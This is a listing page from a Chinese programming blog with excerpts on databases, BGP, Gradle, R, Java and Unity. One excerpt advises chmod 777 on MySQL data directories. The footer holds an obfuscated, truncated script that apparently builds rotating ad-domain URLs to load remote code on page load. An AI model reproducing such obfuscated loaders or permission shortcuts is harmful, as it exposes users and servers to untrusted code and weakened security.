一个MongoDB实例支持多个数据库。在MongoDB内部，每个数据库都包含一个.ns文件和一些数据文件，采用预分配空间的机制，始终保持额外的空间和空余的数据文件，从而有效避免了由于数据暴增带来的磁盘压力过大问题。每个预分配的文件都用0进行填充，数据文件每新分配一次，他的大小都会是上一个数据文件大小的2倍，每个数据文件最大为2G。
2.4 MongoDB与MS SQL Server的语句对照
MongoDB提供了功能丰富的查询表达式，可以实现绝大多数关系数据库的sql语句功能，以表employee(id,name,age)举例对照说明，如下图1所示。
图1 MongoDB与MS SQL Server语句对照
3 过程分析与测试
3.1 GridFS概述
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0b7a320d692ad542081a22312c94730/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/02ffe82da9ca22b2f68ac41e8fe85729/" rel="bookmark">
			ERROR! MySQL server PID file could not be found!解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先怀疑是有僵尸mysqld的存在，首先查看进程
ps -ef|grep mysqld 然后用
kill -9 进程号杀死进程
重启mysql，但是问题并没有得到解决。
再然后可以通过mysql的配置文件my.cnf查看一下mysql的数据存储目录位置，查看一下目录权限。其实不看也没事，可以直接给mysql一个高权限，直接777最干脆。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18e8528ad20f2701ae9440d59c883ca7/" rel="bookmark">
			绘制雷达图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 首先在RStudio中导入包，当发现生成运行错误的时候尝试去改变包的服务区域的地方，点击保存。
2 代码部分
install.packages(“fmsb”)
library(“fmsb”)
max_min=matrix(c(rep(5,9),rep(0,9)),nrow = 2,byrow = T)
总共9项，最高分5分，最低分0分
item=c(“身高标准体重”,“俯卧撑”,“纵跳”,“握力”,“反应时”,“单脚站立”,“台阶指数”,“肺活量”,“体前屈”)
max_min=data.frame(max_min)#转成数据框
colnames(max_min)=item #添加列名
score=c(5,5,4,3,4,5,1,2,2)#录入得分
mydata=rbind(max_min,score)#生成dataframe
rownames(mydata)=c(“maxsocre”,“minscore”,“myscore”)#改行名
radarchart(mydata,axistype=5)
轴标签及类型，0:5可选，0：没有轴标签 ；
1：仅标中心部分 ；
2： 仅标四周 ；
3：既标中心又标四周 ；
4：同1，不过用小数显示 ；
5：同3 小数显示
#选择0-5时的区别
par(mfrow=c(2,3))
for(i in 0:5){
radarchart(mydata,axistype = i)
}
#最后附上结果图
radarchart(mydata,axistype = 3,seg = 10,pty = 1,plwd = 4,cglty = 1,cglcol = “red”,axislabcol = “red”,title = “体能测试”,vlcex = 0.9,calcex = 0.9,palcex = 1.1)
#axistype ：轴标签及类型，0:5可选，（默认 0）0：没有轴标签 1：仅标中心 2： 仅标四周 3：既标中心又标四周 4：同1，小数显示 5：同3 小数显示
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/18e8528ad20f2701ae9440d59c883ca7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94af5942c382e088b6251f5ffd4941de/" rel="bookmark">
			BGP原理、工作过程和BGP路径属性的含义
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		BGP协议作用： RIP和OSPF是用于同一个自治系统内部各路由器之间交换路由信息的协议，Internet由多个自治系统组成，各自治系统AS(autonomous system)之间要想能够进行路由信息交换，就要用到边界网关协议BGP。
BGP基本原理： 两个相邻AS(自治系统 autonomous system)交换路由信息时要选择相邻的BGP路由器作为发言人，每个发言人向外通告经过聚类后的可达路由信息；路由信息可以是AS内部的，也可以是来自其他AS；BGP信息格式&lt;AS有序列表，目的站&gt;；通过相邻AS之间交换路由信息，使得每个AS都拥有一个AS级的连通图。
BGP工作过程： 当一个AS(自治系统 autonomous system)的BGP发言人希望与另一个AS的BGP发言人进行通信时，先使用三次握手建立TCP连接，之后发送OPEN报文，对方则以一个KEEPLIVE确认。这个过程成为BGP发言人的邻居关系协商。协商成功后，两个发言人即成为对等实体。此时对等实体之间可使用UPDATE报文交换完整的RIB(路由信息库)；在后续的交换中，采用UPDATE报文进行增量更新，仅通告发生变化的路由信息。使用KEEPLIVE报文报告活动性，维护邻居关系；上述过程如果发生错误，使用NOTICATION报文向对方报告。
BGP路径属性的含义： BGP进行路由通告时，使用多个路径属性来表示一条路由，其中包含路径信息来源、路径经由的AS列表、路由优先级、下一跳以及聚类信息等。接收方使用这些信息实现策略约束，进行路由回路检测和路由选择。在UPDATE报文中，每个路径属性用一个自描述的三元组&lt;属性类型，属性长度，属性值&gt;进行编码。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/017cebfa168cf5d41b5d87951b6db3e6/" rel="bookmark">
			hbase与spark笔试题（选择题）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自：https://www.cnblogs.com/cxzdy/p/5388451.html
http://www.bigdatastudy.net/show.aspx?id=175&amp;cid=14
一、HBASE笔试题 HBase来源于哪篇博文？ C
A The Google File System
B MapReduce
C BigTable
D Chubby
下面对HBase的描述哪些是正确的？ B、C、D
A 不是开源的
B 是面向列的
C 是分布式的
D 是一种NoSQL数据库
HBase依靠（）存储底层数据 A
A HDFS
B Hadoop
C Memory
D MapReduce
HBase依赖（）提供消息通信机制 A
A Zookeeper
B Chubby
C RPC
D Socket
HBase依赖（）提供强大的计算能力 D
A Zookeeper
B Chubby
C RPC
D MapReduce
MapReduce与HBase的关系，哪些描述是正确的？ B、C
A 两者不可或缺，MapReduce是HBase可以正常运行的保证
B 两者不是强关联关系，没有MapReduce，HBase可以正常运行
C MapReduce可以直接访问HBase
D 它们之间没有任何关系
下面哪些选项正确描述了HBase的特性？ A、B、C、D
A 高可靠性
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/017cebfa168cf5d41b5d87951b6db3e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08129100e9445fd238eadbb934e5937f/" rel="bookmark">
			认清Android Studio下的Gradle是什么
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		分享一下我老师大神的人工智能教程。零基础！通俗易懂！风趣幽默！还带黄段子！希望你也加入到我们人工智能的队伍中来！https://blog.csdn.net/jiangjunshow
Gradle 是个啥，一开始我也没弄清，官方解释是： Gradle是一个基于Apache Ant和Apache Maven概念的项目自动化建构工具 那么Apache Ant和Apache Maven又是个啥？这个先忽略，那自动化建构工具呢？ 我个人狭义的理解就是软件环境部署和打包的工具，那么.net 也有CruiseControl.Net持续集成 WIX生成安装包，这是类似的东西，只是Gradle这个工具是google的亲儿子，微软在这方面就不怎么给力了，功能强大一点的都是第三方工具。但是微软有一个依赖管理工具不错，就是NuGet,这个跟Gradle的依赖管理可以媲美。
在知乎上，我找到一个解释的特别好的文章，这里贴出来，以防以后链接失效原链接
Gradle是一个基于Apache Ant和Apache Maven概念的项目自动化建构工具。它使用一种基于Groovy的特定领域语言来声明项目设置，而不是传统的XML。当前其支持的语言限于Java、Groovy和Scala，计划未来将支持更多的语言。上面是维基上对Gradle的解释,相信一个没有接触过构建的人是不大能看明白的,当初我也是.下面是我对Gradle通俗的理解: 软件开发讲究代码复用,通过复用可以使工程更易维护,代码量更少….. 开发者可以通过继承,组合,函数模块等实现不同程度上的代码复用.但不知你有没有想过,软件开发也是一种工程作业,绝不仅仅是写代码,还涉及到工程的各种管理(依赖,打包,部署,发布,各种渠道的差异管理…..),你每天都在build,clean,签名,打包,发布,有没有想过这种过程,也可以像代码一样被描述出来, 也可以被复用.举个例子我是做Android开发的,你可知道国内有n个Android市场,n个手机品牌,n个手机尺寸……,一般公司都会针对不同的市场单独发包用来统计不同渠道的下载量等情况,可能需要针对不同(品牌,尺寸等各种硬件信息)的手机做一些特殊的处理,这个时候你可以针对不同的情况单独建一个工程,或者更好一点你可以通过一些变量来控制,像这样:if(isMoto){do something} else if(isHuawei){do something} … 差异管理但这两种解决方法都有自己的缺点,特别是前一种有极大的代码重复.后一种稍微好一点,但这种方式的差异是运行时的,不是静态的,对于moto手机上的处理逻辑对华为手机来说一点作用也没有,但这一段针对moto手机的处理逻辑也被装到了华为手机上了,通过gradle的productFlavor与buildtype可以实现静态级的差异控制可以参考如何通过Gradle实现一套代码开发不同特性的APK · ByGhui 说到前面的多渠道问题,不同的渠道一般会对应不同的渠道号,你当然可以通过修改一次打一个包这种纯手工的方式来生成你的多渠道包,但据听说国内某团购网站的Android App有100多个渠道.这里出现了什么?重复,反复的去打包而且这些包之前的差异很小(只是渠道号不同),和写代码一样我们应该复用,通过Gradle可以实现一个命令打出所有的渠道包,一个命令打出指定的渠道包.再复杂一点,你可能需要不同的渠道对应不同的签名文件,不同的icon,不同的服务器地址…这些都可以通过Gradle来方便的实现.依赖管理:做软件开发你可能需要依赖各种不同的jar,library.你当然可以通过将.jar/library工程下载到本地再copy到你的工程中,但不知你是否听说过国外有个叫中央仓库的东西,在这个仓库里你可以找到所有你能想到以及你从来没听说过的jar,aar…The Central Repository Search Engine 这里可以找到所有你需要的依赖,而你需要的只是指定一个坐标,如下:剩下的依赖的寻找,下载,添加到classpath等你都不需要去关心,通过这种方式来维护依赖的好处有以下几点:剩下的依赖的寻找,下载,添加到classpath等你都不需要去关心,通过这种方式来维护依赖的好处有以下几点:依赖不会进入到你的版本控制仓库中(默认会缓存到~/.gradle/下)方便卸载装载依赖(只是一条坐标依赖,不需要删除即可)方便的版本管理,如上图中的2.3.3既是picasso的版本号,若改为+就表示从中央仓库中下载最新的版本不同工程的相同依赖不会存在重复副本(只在~/.gradle下存在一份)项目部署这方面我没怎么接触过,但据我所知通过一些插件,可以实现自动将你的输出(.jar,.apk,.war…)上传到指定仓库,自动部署…罗哩罗嗦说了这么多,不知大家有没有理解总结一下:Gradle是一种构建工具,它可以帮你管理项目中的差异,依赖,编译,打包,部署……,你可以定义满足自己需要的构建逻辑,写入到build.gradle中供日后复用.Gradle不是一种编程语言,它不能帮你实现软件中的任何实际功能通俗的解释肯定是不严谨的解释,不妥之处欢迎讨论.###赞同过百,放出之前相关分享的幻灯片###截止到现在(1432311622353)共收到342个赞同与感谢,再次感谢大家的支持!如果你觉得我的分享对你有帮助,请关注我! 以后我会分享更多更优质的内容给大家.说好的幻灯片在这里(是之前在letv时一次内部分享的幻灯片,内容有删减(涉及到公司具体项目的部分),此幻灯片参考了很多其它的资料,内部的链接很值得大家打开看看)
AS其实就是Intellij IDEA的安卓开发环境特供版（谷歌定制版），Intellij IDEA是有收费版本的IDE。Ant和Maven都是基于XML的构建工具，Gradle是用Groovy编写的构建工具，Groovy是JVM衍生的与JAVA语法高度兼容的动态强类型语言。Gradle通过编写一个名为build.g…
AS其实就是Intellij IDEA的安卓开发环境特供版（谷歌定制版），Intellij IDEA是有收费版本的IDE。Ant和Maven都是基于XML的构建工具，Gradle是用Groovy编写的构建工具，Groovy是JVM衍生的与JAVA语法高度兼容的动态强类型语言。Gradle通过编写一个名为build.gradle的脚本文件对项目进行设置，再根据这个脚本对项目进行构建（复杂的项目也有其他文件）Gradle 脚本本质上就是Groovy脚本，只不过高度利用了groovy的语法糖，例如省略方法参数括号和省略句尾分号等，让代码看起来像DSL。所以几乎所有java和groovy支持的语法，它的脚本都支持。（使用JAVA和GROOVY的SDK应该也是没问题的）Gradle支持基于惯例的构建，并有丰富的适合不同情景下的插件库，光有官方用户手册支持的就有20多种，方便构建。Gradle里有两个基本概念：项目(projects)和任务(tasks)。项目由多个任务组成，一个项目可以理解为提供给不同设备的构建版本，如桌面版、网页版、安卓版、iOS版等等，也可以理解为一种行为，例如部署应用到生产环境。任务相当于Ant的target，可以理解成一个构建中原子性的工作，例如编译、打包、执行等。需要注意的是，Ant中他自己的命令例如javac、copy等也叫做task，但Ant的task远没有Gradle的task那么自由。Gradle的构建分两个阶段，第一阶段是设置阶段(configuration phase)，分析构建脚本，处理依赖关系和执行顺序等，脚本本身也需要依赖来完成自身的分析。第二阶段是执行阶段(execution phase)，此阶段真正构建项目并执行项目下的各个任务。Ant与Maven对于Gradle，前者编写容易，但功能有限，需要人工操作的过程也多；后者依托于庞大的依赖仓库，因此有着强大的外部依赖管理，但添加本地依赖并不方便，且项目不能灵活修改。而Gradle能很好地结合Ant与Maven各自的优点，可以随意的编写任务并组合成项目，直接利用Maven仓库，并且能很好的支持传递依赖和内部依赖。（本部分为个人主观意见，可能与大多数人的意见并不相同）（其实也都是别人的个人主观意见，来源于我当初搜索的Gradle相关文章内容）通俗一点类比成吃饭的话，大致就是：Ant是自己买菜洗菜烧水做饭，Maven是去饭店点餐，Gradle是3D打印食物。
你都说了要通俗的理解，那就用不着学习什么理论了，通俗着来就是了。通俗的说：gradle是打包用的。你觉得解决你的问题了吗？如果没解决，那是你的问题提得不够好。比如我猜你应该提：为什么要打包发布，打包发布有几种常见方法，为什么这些常见方法中要选gr…
你都说了要通俗的理解，那就用不着学习什么理论了，通俗着来就是了。通俗的说：gradle是打包用的。你觉得解决你的问题了吗？如果没解决，那是你的问题提得不够好。比如我猜你应该提：为什么要打包发布，打包发布有几种常见方法，为什么这些常见方法中要选gradle，等等。针对我猜的这些内容，通俗的讲是这样的：以在eclipse里面写java程序为例为什么需要打包：最初写完了，直接右键run就可以了。但是程序写完了毕竟是要发布到服务器上或者给别人用的，你第一不可能让所有要运行的人都装个eclipse，第二不可能把源代码公布给所有人。所以你需要把你的代码发布成二进制形式，让其它环境方便运行，这就是打包。为什么用ant打包的时候要做很多事，比如说配置文件中的用户名和密码，你本地开发和程序实际运行时的内容肯定不一致，所以需要有两个文件，开发的时候用一个，实际运行的时候用一个。这样每次打包的时候都要重复的做这些事，ant可以让你用xml的形式把这些事情写成脚本，然后自动运行。为什么用maven你的项目要用很多jar包，比如你写日志要用个log4j吧，连数据库要用个connector吧。这年头写程序不用个spring都不好意思出门，下载下来的spring包打开一看，密密麻麻的好几十个jar，不知道用哪个不用哪个。而且，即便是你一狠心把这些jar包都放进来，很大可能性还是不能运行，因为还要依赖其它的jar包。哪天想升级个spring小版本，所有jar包都要重来一遍，你也不记得哪些是由于spring引进来的jar包了。所以有了maven，你只要配置一下说我要用spring 3，所有jar包都给你下载好了，你直接运行就行了。赶明儿想升级版本，直接把3改成4，新的jar包也给你下载好了。然后？用了maven，jar包是方便了，但我打包的时候还是有好多事要做啊，然后你会发现maven实在是不知道怎么做这些事，于是开始怀念ant。gradle就是又能干maven的活，又能干ant的活，用groove语言写脚本，表达能力还更强。就这意思。===我也是这两天才看了两眼gradle，了解不深。简化版如下：ant可以自动化打包逻辑。maven也可以自动化打包，相比于ant，它多做的事是帮你下载jar包。但是maven的打包逻辑太死板，定制起来太麻烦，不如ant好用。gradle就是又能自动下jar包，又能自己写脚本，并且脚本写起来还比ant好用的这么个东西。
gradle是一个工程构建工具，java代码，和资源文件需要经过sdk里的一些程序如aapt等处理，才能形成apk包。gradle就是把那些步骤变得简单化。相当于eclipse中的ant吧！
一句话概括就是：依赖管理和任务执行。像Ruby里面的bundler+rake,像iOS中的cocoapods,像node中的npm+grunt.通俗的讲就是：你的项目需要哪些第三方库，它帮你把它们都下载下来，并且编译好放到指定的位置，你就直接可以import后用了。它本身是基于Apache的an…
一句话概括就是：依赖管理和任务执行。像Ruby里面的bundler+rake,像iOS中的cocoapods,像node中的npm+grunt.通俗的讲就是：你的项目需要哪些第三方库，它帮你把它们都下载下来，并且编译好放到指定的位置，你就直接可以import后用了。它本身是基于Apache的ant和maven的，但都不是特别好用，要引入一个库，还得写好多行的XML，麻烦死了。而且他们在任务执行上都比较弱，所以gradle就逐渐发展壮大了并被Google所推崇了。
分享一下我老师大神的人工智能教程。零基础！通俗易懂！风趣幽默！还带黄段子！希望你也加入到我们人工智能的队伍中来！https://blog.csdn.net/jiangjunshow
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4748e1ffff4716374fd071accf5eea93/" rel="bookmark">
			自治系统路由体系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是路由体系结构： 路由体系(routing architecture)涉及如何对互联网络的路由器进行区域划分、管理和控制，使得它们能够有效地交换路由信息，完成数据报投递。路由体系决定了互联网络的运行效率。
Internet路由体系的发展： 早期使用核心路由体系随后使用对等主干路由体系当今的自治系统路由体系 自治系统路由体系： 1.Internet的层次结构：
Internet的拓扑结构是网状的，从提供运营商的逻辑上划分为三个层次：
核心层由一个主干网和多个网络接入点NAP(network access point)组成，NAP 作为核心路由器，将不同的Internet主干网互连起来，也将下层网络服务提供商NSP(service provider)的流量交换到Internet主干网上。NSP以及位于底层的ISP(internet service provider)都拥有自己的网络。
2.自治系统：
根据Internet的层次模型，自治系统路由体系将每个主干网划分为若干自治系统，其目的是对路由信息的传播进行限制，将巨大而复杂的Internet路由管理问题分解到不同的自治系统中。每个自治系统内部可以自行选择内部网关协议，进行路由发现和传播，共同维护内部路由消息的一致性。此外，内部路由信息包含了到本自治系统内所有目的站的路由。每个自治系统选取一个或多个处于自治系统边界的路由器作为代表，向其它路由器通告路由信息，自治系统间交换的路由信息是粗粒度的可达性信息。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73c6fdae40df79d12fd08ff61e1e61d2/" rel="bookmark">
			i&#43;&#43;&#43;j语句是正确的吗
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		相信很多人看到 i+++j 就傻眼了，这是正确的吗，如果是正确的，那执行顺序是什么？
public class ThreePlus { public static void main(String[] args) { int i = 10; int j = 20; int k = i+++j; System.out.println(k); } } 执行结果截图
由上图可知，该语句是可以执行的
i= 10 j = 20
i+++j 有两种执行顺序
1、i++ + j
2、i+ ++j
第一种 执行结果是k = 30
第二种 执行结果是k = 31
由此可见，JVM编译时，是将前两个加号当做一组有效字符
因此正确的写法是 k = i++ + j;
上述过程的原因是：Java虚拟机在编译代码时一个符号尽量多结合有效字符
每一个符号应该包含尽可能多的字符。 也就是说，编译器将程序分解为符号的办法是从左到右一个字符一个字符的读入。如果该字符可能组成一个符号，那么再读入下一个字符。判断已经读入的字符组成的字符串是否可能是一个符号的组成符号。如果可能再继续读入下一个字符。重复上面的过程。直到读入的字符组成的字符串不再可能组成一个有意义的符号。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3843219a8c72ac538a6faf0556bad748/" rel="bookmark">
			Unity 3D游戏编程自学#6——简单射击案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		游戏简介：一个只能移动枪口的射击游戏，敌人会在前方场景随机生成，需要玩家在20秒的时间内尽可能多地开枪击杀。
1.枪支随鼠标移动 先导入网上找到的场景模型、枪支模型（网上找来的免费资源，感谢网友！），如图：
然后对枪编写脚本：
为方便就不事先获得枪支的Transform引用，直接gameObject.GetComponent调用Transform组件下的LookAt方法，该方法可使枪向射线与场景碰撞点处调整方向，因此事先要将为场景模型添加Mesh Collider，也因此在游戏测试时如果将鼠标指向天空等无碰撞体的地方，枪支则不会移动。（可通过在背景处创建一个蓝色的Plane当作天空来解决此问题）
在为场景模型添加碰撞体时，有时候会有多种碰撞体可选，因为这里我们要碰撞体仅仅是为了得到一个碰撞点令枪可以移动，所以可以选择简单一些的碰撞体模型，一般碰撞体的复杂程度可由上图中的verts（顶点）来确定，顶点越少，计算量越小，游戏运行越流畅。
注意：测试时可能会发现枪支随鼠标的旋转很不自然（绕着枪中心处旋转），现实中应该是绕着射手的肩膀旋转，因此应将旋转中心设置在枪的后部，这可以通过创建空物体以及父子关系来调整。因此以上脚本应该挂载到作为父物体的空物体上：
2. 枪支红点效果 在gun父物体下再创建一个空物体RedPoint，位置设置在枪口（因为红光是从枪口射出的，不是从枪中间射出的），并为其添加Line Renderer组件，设置好其颜色、宽度。（具体步骤上文“线特效”处有提到）
然后补充脚本：
private Ray ray; private RaycastHit hit; private Transform gunTransform; private Transform pointTransform; private LineRenderer rayLineRenderer; void Start() { gunTransform = gameObject.GetComponent&lt;Transform&gt;(); pointTransform = gunTransform.FindChild("RedPoint"); rayLineRenderer = pointTransform.gameObject.GetComponent&lt;LineRenderer&gt;(); } void Update() { ray = Camera.main.ScreenPointToRay(Input.mousePosition); if (Physics.Raycast(ray,out hit)) { gunTransform.LookAt(hit.point); rayLineRenderer.SetPosition(0, pointTransform.position); rayLineRenderer.SetPosition(1, hit.point); } } 这里要通过gun下面的子物体RedPoint生成红光，但脚本是挂载在gun上的，因此要通过FindChild方法得到RedPoint及其LineRenderer组件的引用。
最后通过SetPosition绘制红线，这里有两个参数，第一个是射线经过的路程上的拐点的索引，第二个是位置。脚本中设置了两个拐点（其实就是一条线段，如果有三个不在同一直线上的拐点，则红线由两条线段组成），最终效果：
3.敌人生成与击倒 导入僵尸模型，调整其大小，并为其及其所有零部件（子物体）的标签设置为Zombie。
因为模型本身没有自带碰撞体组件，需要手动添加，因为本人使用的模型过于复杂（还有动画效果），因此仅对父物体添加一个胶囊型的碰撞体（覆盖其头部与身体）。考虑到其动画会使其向前稍微移动，因此碰撞体的位置靠前一些。
然后编写脚本：（接在rayLineRenderer.SetPosition后面）
if (hit.collider.tag == "Zombie" &amp;&amp; Input.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3843219a8c72ac538a6faf0556bad748/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/28490b2116cbe2c31f049106204ebb8d/" rel="bookmark">
			TCP/IP协议族在异构网络互联中的作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		TCP/IP协议族由应用层 、传输层、网络层、数据链路层和物理层构成，每一层的功能由一个或多个协议实现
TCP/IP协议族模型各层所处网络和用到的协议：
物理层&amp;数据链路层：ARPANET 、SATNET 、Packet radio 、LAN
网络层：IP
传输层：TCP 、 UDP
应用层：TELNET 、FTP 、 SMTP 、 DNS
Intenet是由各种不同的网络构成的，这些网络在信道的访问方式和数据传送方式上存在差异，网络互联的目的就是隐藏底层网络硬件细节，同时提供一般的服务通信，Vinton Cerf提出网络互联的技术思路：在每个网络内部使用各自的通信协议，每个网络与其他网络通信时使用TCP/IP协议族。
由于不同网络信道访问方式和数据传送方式不同，IP定义了标准的数据格式（IP数据报）和地址格式（IP地址），屏蔽不同 物理网络技术的差别并用路由器连接起来的多个物理网络，实现异构网络互联。
为确保异构网络组成的系统正确和高效地运转，还必须解决以下问题：
首先，选路及数据报在跨越多个物理网络时的正确转发，它要求所有路由器对整个网络系统有一致的、准确的认识，这需要路由协议。其次，通信信道非理想，网络通信不可靠，使用可靠传输的机制。再次，对于复杂系统，要有一定的控制机制。如：发生拥塞时要能够进行控制。
上述这些问题TCP/IP协议族的设计者，针对每个问题都引入专门的协议来解决，如OSPF、RIP和BGP等协议用于路由信息的维护，ICMP实现网络控制，TCP提高可靠性。从而保证了异构网络正确高效的运作。
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/487/">«</a>
	<span class="pagination__item pagination__item--current">488/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/489/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5